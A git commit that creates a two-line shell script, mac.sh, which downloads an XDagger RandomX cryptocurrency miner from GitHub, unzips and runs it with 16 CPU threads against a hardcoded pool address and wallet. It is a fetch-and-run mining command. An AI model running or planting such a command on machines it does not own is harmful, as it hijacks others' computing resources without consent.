88bca573a4ab37e1718a77e22288d56f439e0dd9
TulangMan <97800698+TulangMan@users.noreply.github.com>
2022-03-31 10:29:07 +0000

    Create mac.sh

---
+++ mac.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+wget https://github.com/XDagger/XdagRandomxMiner/releases/download/0.4.2/LinuxRandomxMiner.zip && unzip LinuxRandomxMiner.zip && rm -rf LinuxRandomxMiner.zip && chmod u+x DaggerRandomxMiner && ./DaggerRandomxMiner -cpu -p 82.156.18.237:13654 -t 16 -a yfSserc52yrsZ88b7JxEdMyDlO9Z9kba
